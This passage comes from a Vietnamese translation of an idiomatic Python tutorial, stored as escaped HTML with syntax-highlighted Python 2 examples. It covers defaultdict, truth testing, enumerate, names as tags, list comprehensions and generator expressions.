    &lt;span class="n"&gt;equities&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;portfolio&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;equity&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Trong ví dụ này, hàm nhà máy mặc định là &lt;tt class="docutils literal"&gt;list&lt;/tt&gt;. Để tạo từ điển giá trị mặc định là 0 thì dùng &lt;tt class="docutils literal"&gt;int&lt;/tt&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;navs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;defaultdict&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;portfolio&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;equity&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;position&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;navs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;portfolio&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;position&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;prices&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;equity&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Vì khóa mới luôn được tạo nên bạn sẽ không gặp &lt;tt class="docutils literal"&gt;KeyError&lt;/tt&gt; với &lt;tt class="docutils literal"&gt;defaultdict&lt;/tt&gt;. Bạn phải dùng &lt;tt class="docutils literal"&gt;in&lt;/tt&gt; để kiểm tra xem một khóa đã có trong từ điển hay chưa.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="kiem-tra-gia-tri-dung"&gt;
&lt;h2&gt;Kiểm tra giá trị đúng&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# dùng:           # không dùng:&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;             &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;pass&lt;/span&gt;              &lt;span class="k"&gt;pass&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Nếu là một danh sách:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# dùng:           # không dùng:&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;         &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;pass&lt;/span&gt;              &lt;span class="k"&gt;pass&lt;/span&gt;

                  &lt;span class="c1"&gt;# and definitely not this:&lt;/span&gt;
                  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;items&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="p"&gt;[]:&lt;/span&gt;
                      &lt;span class="k"&gt;pass&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Để điều khiển giá trị đúng của các trường hợp của một lớp người dùng định nghĩa, sử dụng các phương thức đặc biệt &lt;tt class="docutils literal"&gt;__nonzero__&lt;/tt&gt; hoặc &lt;tt class="docutils literal"&gt;__len__&lt;/tt&gt;. Dùng &lt;tt class="docutils literal"&gt;__len__&lt;/tt&gt; nếu lớp đó là một lớp chứa (container) có chiều dài:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MyContainer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__len__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;Return my length.&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Nếu lớp đó không phải là một lớp chứa thì dùng &lt;tt class="docutils literal"&gt;__nonzero__&lt;/tt&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MyClass&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__nonzero__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;Return my truth value (True or False).&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
        &lt;span class="c1"&gt;# This could be arbitrarily complex:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;bool&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Trong Python 3.0, &lt;tt class="docutils literal"&gt;__nonzero__&lt;/tt&gt; được đổi tên thành &lt;tt class="docutils literal"&gt;__bool__&lt;/tt&gt; để đồng nhất với kiểu &lt;tt class="docutils literal"&gt;bool&lt;/tt&gt; có sẵn. Thêm dòng sau vào lớp của bạn cho nó tương hợp hơn:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;__bool__&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="fm"&gt;__nonzero__&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="chi-muc-va-phan-tu"&gt;
&lt;h2&gt;Chỉ mục và phần tử&lt;/h2&gt;
&lt;p&gt;Dùng &lt;tt class="docutils literal"&gt;enumerate()&lt;/tt&gt; để lặp:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;enumerate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt;

&lt;span class="c1"&gt;# thay vì:              # thay vì:&lt;/span&gt;
&lt;span class="n"&gt;index&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;               &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;          &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt;
    &lt;span class="n"&gt;index&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;tt class="docutils literal"&gt;enumerate()&lt;/tt&gt; trả về một bộ lặp (iterator) (một bộ sinh, generator, là một kiểu bộ lặp):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;enumerate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;enumerate object at 0xb73ee0f4&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;enumerate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="go"&gt;(0, &amp;#39;zero&amp;#39;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="go"&gt;(1, &amp;#39;one&amp;#39;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="go"&gt;(2, &amp;#39;two&amp;#39;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="go"&gt;(3, &amp;#39;three&amp;#39;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="gt"&gt;Traceback (most recent call last):&lt;/span&gt;
&lt;span class="err"&gt;  File &amp;quot;&amp;quot;, line 1, in ?&lt;/span&gt;
&lt;span class="x"&gt;StopIteration&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="cac-ngon-ngu-khac-co-bien"&gt;
&lt;h2&gt;Các ngôn ngữ khác có &lt;em&gt;biến&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Trong các ngôn ngữ khác, gán vào một biến là đưa giá trị vào một hộp.&lt;/p&gt;
&lt;table border="1" class="docutils"&gt;
&lt;colgroup&gt;
&lt;col width="64%" /&gt;
&lt;col width="36%" /&gt;
&lt;/colgroup&gt;
&lt;tbody valign="top"&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;int a = 1;&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;&lt;img alt="a1box" src="/static/idiomatic-python/a1box.png" /&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Hộp &lt;tt class="docutils literal"&gt;a&lt;/tt&gt; bây giờ chứa một số nguyên 1.&lt;/p&gt;
&lt;p&gt;Gán một giá trị khác vào cùng biến đó sẽ thay thế những gì đã có trong hộp.&lt;/p&gt;
&lt;table border="1" class="docutils"&gt;
&lt;colgroup&gt;
&lt;col width="57%" /&gt;
&lt;col width="43%" /&gt;
&lt;/colgroup&gt;
&lt;tbody valign="top"&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;a = 2;&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;&lt;img alt="a2box" src="/static/idiomatic-python/a2box.png" /&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Gán một biến vào một biến khác sẽ tạo một bản sao của giá trị trong hộp này và đặt nó vào hộp mới.&lt;/p&gt;
&lt;table border="1" class="docutils"&gt;
&lt;colgroup&gt;
&lt;col width="47%" /&gt;
&lt;col width="26%" /&gt;
&lt;col width="26%" /&gt;
&lt;/colgroup&gt;
&lt;tbody valign="top"&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;int b = a;&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;&lt;img alt="b2box" src="/static/idiomatic-python/b2box.png" /&gt;&lt;/td&gt;
&lt;td&gt;&lt;img alt="a2box" src="/static/idiomatic-python/a2box.png" /&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;tt class="docutils literal"&gt;b&lt;/tt&gt; là một hộp mới, có giá trị là bản sao của số nguyên 2. Trong khi hộp &lt;tt class="docutils literal"&gt;a&lt;/tt&gt; có một bản sao riêng.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="python-co-ten"&gt;
&lt;h2&gt;Python có &lt;em&gt;tên&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Trong Python, &lt;em&gt;tên&lt;/em&gt; hoặc &lt;em&gt;định danh&lt;/em&gt; giống như thẻ tên gắn vào một đối tượng.&lt;/p&gt;
&lt;table border="1" class="docutils"&gt;
&lt;colgroup&gt;
&lt;col width="55%" /&gt;
&lt;col width="45%" /&gt;
&lt;/colgroup&gt;
&lt;tbody valign="top"&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;a = 1&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;&lt;img alt="a1tag" src="/static/idiomatic-python/a1tag.png" /&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Ở đây, số nguyên 1 được gắn một thẻ tên &lt;tt class="docutils literal"&gt;a&lt;/tt&gt;.&lt;/p&gt;
&lt;p&gt;Nếu chúng ta gán lại vào &lt;tt class="docutils literal"&gt;a&lt;/tt&gt;, chúng ta chỉ chuyển thẻ &lt;tt class="docutils literal"&gt;a&lt;/tt&gt; vào một đối tượng khác.&lt;/p&gt;
&lt;table border="1" class="docutils"&gt;
&lt;colgroup&gt;
&lt;col width="44%" /&gt;
&lt;col width="36%" /&gt;
&lt;col width="20%" /&gt;
&lt;/colgroup&gt;
&lt;tbody valign="top"&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;a = 2&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;&lt;img alt="a2tag" src="/static/idiomatic-python/a2tag.png" /&gt;&lt;/td&gt;
&lt;td&gt;&lt;img alt="1" src="/static/idiomatic-python/1.png" /&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Giờ đây tên &lt;tt class="docutils literal"&gt;a&lt;/tt&gt; được gắn vào số nguyên 2. Số nguyên 1 có thể vẫn còn tồn tại nhưng nó không còn thẻ tên &lt;tt class="docutils literal"&gt;a&lt;/tt&gt;.&lt;/p&gt;
&lt;p&gt;Nếu chúng ta gán một tên vào một tên khác, chúng ta chỉ là gắn một thẻ tên khác vào đối tượng đã có.&lt;/p&gt;
&lt;table border="1" class="docutils"&gt;
&lt;colgroup&gt;
&lt;col width="52%" /&gt;
&lt;col width="48%" /&gt;
&lt;/colgroup&gt;
&lt;tbody valign="top"&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;b = a&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;&lt;img alt="ab2tag" src="/static/idiomatic-python/ab2tag.png" /&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Tên &lt;tt class="docutils literal"&gt;b&lt;/tt&gt; chỉ là một thẻ tên thứ hai được gắn vào cùng một đối tượng như thẻ tên &lt;tt class="docutils literal"&gt;a&lt;/tt&gt;.&lt;/p&gt;
&lt;p&gt;Trong Python, &lt;em&gt;biến&lt;/em&gt; là những thẻ tên, không phải là những hộp được đánh tên.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="gop-danh-sach-list-comprehension-hay-listcomp"&gt;
&lt;h2&gt;Gộp danh sách (list comprehension, hay listcomp)&lt;/h2&gt;
&lt;p&gt;Thông thường:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;new_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;a_list&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;condition&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;new_list&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Với listcomp:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;new_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;fn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;a_list&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;condition&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Listcomp rõ ràng và xúc tích. Listcomp có thể chứa nhiều vòng &lt;tt class="docutils literal"&gt;for&lt;/tt&gt; hoặc câu lệnh &lt;tt class="docutils literal"&gt;if&lt;/tt&gt; nhưng nếu nhiều hơn 2 hay 3 thì tốt nhất là nên dùng cách thông thường. Ví dụ danh sách bình phương của các số lẻ từ 0 tới 9:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="go"&gt;[1, 9, 25, 49, 81]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="bieu-thuc-bo-sinh-generator-expression-genexp"&gt;
&lt;h2&gt;Biểu thức bộ sinh (generator expression, genexp)&lt;/h2&gt;
&lt;p&gt;Để tính tổng bình phương từ 1 đến 100 ta có thể dùng vòng lặp &lt;tt class="docutils literal"&gt;for&lt;/tt&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;total&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;num&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;101&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;total&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;num&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;num&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hoặc dùng hàm &lt;tt class="docutils literal"&gt;sum()&lt;/tt&gt; với listcomp:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;total&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;num&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;num&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;num&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;101&lt;/span&gt;&lt;span class="p"&gt;)])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hoặc &lt;tt class="docutils literal"&gt;sum()&lt;/tt&gt; với genexp:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;total&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;num&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;num&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;num&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;101&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Biểu thức bộ sinh giống như gộp danh sách nhưng nó &lt;em&gt;lười&lt;/em&gt; (lazy). Listcomp tạo danh sách ngay lập tức, còn genexp tạo từng giá trị một. Khi chúng ta không cần một danh sách mà chỉ cần từng giá trị của danh sách đó, genext rất hữu dụng. Ví dụ như để tính tổng bình phương từ 1 tới 1000000000, chúng ta sẽ dùng hết bộ nhớ nếu ta dùng listcomp, nhưng với genexp thì chuyện này có thể được thực hiện (mặc dù hơi lâu):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;total&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;num&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;num&lt;/span&gt;
